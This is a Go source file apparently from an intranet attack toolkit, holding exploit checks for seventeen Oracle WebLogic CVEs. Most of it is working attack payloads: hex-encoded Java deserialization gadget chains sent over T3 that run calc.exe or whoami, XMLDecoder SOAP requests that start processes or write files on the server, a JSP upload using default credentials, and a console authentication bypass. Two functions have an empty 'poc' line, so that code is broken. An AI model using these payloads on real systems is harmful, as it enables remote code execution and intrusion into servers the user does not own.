package Scan

import (
	"encoding/hex"
	"fmt"
	"neiwang/Common"
	"strings"
	"sync"
)

type Scan struct {
	result []string
	lock   sync.Mutex
}

func attack_list(target string, s *Scan) {
	check_cve_2014_4210(target, s)
	check_cve_2016_0638(target, s)
	check_cve_2016_3510(target, s)
	check_cve_2017_3248(target, s)
	check_cve_2017_3506(target, s)
	check_cve_2017_10271(target, s)
	check_cve_2018_2628(target, s)
	check_cve_2018_2893(target, s)
	check_cve_2018_2894(target, s)
	check_cve_2018_3191(target, s)
	check_cve_2018_3252(target, s)
	check_cve_2019_2618(target, s)
	check_cve_2019_2725_2729(target, s)
	check_cve_2019_2890(target, s)
	check_cve_2020_2555(target, s)
	check_cve_2020_2883(target, s)
	check_cve_2020_14882(target, s)

}

func attack_domain(target string, s *Scan) {
	check_cve_2014_4210(target, s)
	check_cve_2017_3506(target, s)
	check_cve_2017_10271(target, s)

}

func check_cve_2014_4210(target string, s *Scan) {
	url := "/uddiexplorer/"
	if Common.RequestGET(target+url) == 200 {
		test_results := "[+] " + target + " 存在cve_2014_4210漏洞!\npayload: " + target + url + "\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2014_4210漏洞\n", target)
	}
}

func check_cve_2016_0638(target string, s *Scan) {
	poc := "aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78"
	if Common.Socketconnect(target, poc, "weblogic.jms.common.StreamMessageImpl") == true {
		test_results := "[+] " + target + " 存在cve_2016_0638 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2016_0638 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2016_3510(target string, s *Scan) {
	poc := "aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870"
	if Common.Socketconnect(target, poc, "org.apache.commons.collections.functors.InvokerTransformer") == true {
		test_results := "[+] " + target + " 存在cve_2016_3510 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2016_3510 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2017_3248(target string, s *Scan) {
	poc := "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078"
	if Common.Socketconnect(target, poc, "\\$Proxy[0-9]+") == true {
		test_results := "[+] " + target + " 存在cve_2017_3248 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2017_3248 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2017_3506(target string, s *Scan) {
	url := "/wls-wsat/CoordinatorPortType"
	data := "   <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n          <java>\n            <object class=\"java.lang.ProcessBuilder\">\n              <array class=\"java.lang.String\" length=\"2\">\n                <void index=\"0\">\n                  <string>ping</string>\n                </void>\n                <void index=\"1\">\n                  <string>127.0.0.1</string>\n                </void>\n              </array>\n              <void method=\"start\"/>\n            </object>\n          </java>\n        </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n    </soapenv:Envelope>"
	response := Common.CustomizePost(target, url, data, nil)
	//fmt.Println(response["body"])
	if strings.Contains(response["body"], "<faultstring>java.lang.ProcessBuilder") || strings.Contains(response["body"], "<faultstring>0") {
		test_results := "[+] " + target + " 存在cve_2017_3506漏洞!\n" + "payload: " + target + url + "\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2017_3506漏洞\n", target)
	}
}

func check_cve_2017_10271(target string, s *Scan) {
	url := "/wls-wsat/CoordinatorPortType"
	data := "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n         <java version=\"1.6.0\" class=\"java.beans.XMLDecoder\">\n                    <object class=\"java.io.PrintWriter\"> \n                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/iceberg.txt</string><void method=\"println\">\n                        <string>iceberg_N</string></void><void method=\"close\"/>\n                    </object>\n            </java>\n        </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n</soapenv:Envelope>"
	Common.CustomizePost(target, url, data, nil)
	//fmt.Println(response["body"])
	if Common.RequestGET(target+"/wls-wsat/iceberg.txt") == 200 {
		test_results := "[+] " + target + " 存在cve_2017_10271漏洞!\n" + "payload: " + target + url + "\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2017_10271漏洞\n", target)
	}

}

func check_cve_2018_2628(target string, s *Scan) {
	poc := "aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078"
	if Common.Socketconnect(target, poc, "\\$Proxy[0-9]+") == true {
		test_results := "[+] " + target + " 存在cve_2018_2628 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2018_2628 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2018_2893(target string, s *Scan) {
	poc := "aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000001251e200000000000000100000118aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e310000f1440000000046911fd80000000000000000000000000000007878"
	if Common.Socketconnect(target, poc, "weblogic.jms.common.StreamMessageImpl") == true {
		test_results := "[+] " + target + " 存在cve_2018_2893 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2018_2893 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2018_2894(target string, s *Scan) {
	url1 := "/ws_utc/begin.do"
	url2 := "/ws_utc/config.do"
	if Common.RequestGET(target+url1) == 200 || Common.RequestGET(target+url2) == 200 {
		test_results := "[+] " + target + " 存在cve_2018_2894漏洞!\n" + "payload1: " + target + url1 + "\n" + "payload2: " + target + url2 + "\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2018_2894漏洞\n", target)
	}
}

func check_cve_2018_3191(target string, s *Scan) {
	poc
	if Common.Socketconnect(target, poc, "weblogic.rjvm.ClassTableEntry") == true {
		test_results := "[+] " + target + " 存在cve_2018_3191 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2018_3191 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2018_3252(target string, s *Scan) {
	poc
	data, _ := hex.DecodeString(poc)
	url := "/bea_wls_deployment_internal/DeploymentService"
	headers := map[string]string{
		"Host":            target,
		"wl_request_type": "data_transfer_request",
		"Username":        "weblogic",
		"Password":        "weblogic",
	}
	result := Common.CustomizePost(target, url, string(data), headers)
	if result["statuscode"] == "401" || result["statuscode"] == "500" {
		test_results := "[+] " + target + " 存在cve_2018_3252漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2018_3252漏洞\n", target)
	}
}

func check_cve_2019_2618(target string, s *Scan) {
	url := "/bea_wls_deployment_internal/DeploymentService"
	data := "------WebKitFormBoundaryWebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"iceberg.jsp\"; filename=\"iceberg.jsp\"\nContent-Type: false\n\niceberg\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
	headers := map[string]string{
		"username":                   "weblogic",
		"password":                   "weblogic",
		"wl_request_type":            "app_upload",
		"wl_upload_application_name": "../tmp/_WL_internal/bea_wls_internal/2l6reg/war",
		"Content-Type":               "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
	}
	Common.CustomizePost(target, url, data, headers)
	if Common.RequestGET(target+"/iceberg.jsp") == 200 {
		test_results := "[+] " + target + " 存在cve_2019_2618任意文件上传漏洞!\n" + "payload: " + target + "/iceberg.jsp\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2019_2618任意文件上传漏洞\n", target)
	}

}

func check_cve_2019_2725_2729(target string, s *Scan) {
	var urls = [...]string{"/_async/AsyncResponseService", "/_async/AsyncResponseServiceJms", "/_async/AsyncResponseServiceHttps", "/_async/AsyncResponseServiceSoap12", "/_async/AsyncResponseServiceSoap12Jms", "/_async/AsyncResponseServiceSoap12Https"}
	for _, url := range urls {
		if Common.RequestGET(target+url) == 200 {
			test_results := "[+] " + target + " 存在cve_2019_2725或2729漏洞!\n" + "payload: " + target + url + "\n"
			fmt.Println(test_results)
			s.lock.Lock()
			s.result = append(s.result, test_results)
			s.lock.Unlock()
			break
		} else {
			continue
		}
	}
	fmt.Printf("[-] %v 不存在cve_2019_2725或2729漏洞\n", target)
}

func check_cve_2019_2890(target string, s *Scan) {
	poc := "aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3139322e3136382e31362e31323900001b590000000001eea90b00000000000000000000000000000078"
	if Common.Socketconnect(target, poc, "\\$Proxy[0-9]+") == true {
		test_results := "[+] " + target + " 存在cve_2019_2890 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2019_2890 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2020_2555(target string, s *Scan) {
	payload := "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174"
	poc_len := fmt.Sprintf("%04x", len("whoami"))
	poc_hex := hex.EncodeToString([]byte("whoami"))
	payload += poc_len + poc_hex + "7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070"
	if Common.Socketconnect(target, payload, "weblogic") == true {
		test_results := "[+] " + target + " 存在cve_2020_2555 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2020_2555 T3协议反序列化漏洞\n", target)
	}

}

func check_cve_2020_2883(target string, s *Scan) {
	payload := "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174"
	poc_len := fmt.Sprintf("%04x", len("whoami"))
	poc_hex := hex.EncodeToString([]byte("whoami"))
	payload += poc_len + poc_hex + "74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178"
	if Common.Socketconnect(target, payload, "weblogic") == true {
		test_results := "[+] " + target + " 存在cve_2020_2883 T3协议反序列化漏洞!\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2020_2883 T3协议反序列化漏洞\n", target)
	}
}

func check_cve_2020_14882(target string, s *Scan) {
	url := "/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29"
	if Common.RequestGET(target+url) == 200 {
		test_results := "[+] " + target + " 存在cve_2020_14882漏洞!\n" + "payload: " + target + url + "\n"
		fmt.Println(test_results)
		s.lock.Lock()
		s.result = append(s.result, test_results)
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在cve_2020_14882漏洞\n", target)
	}

}
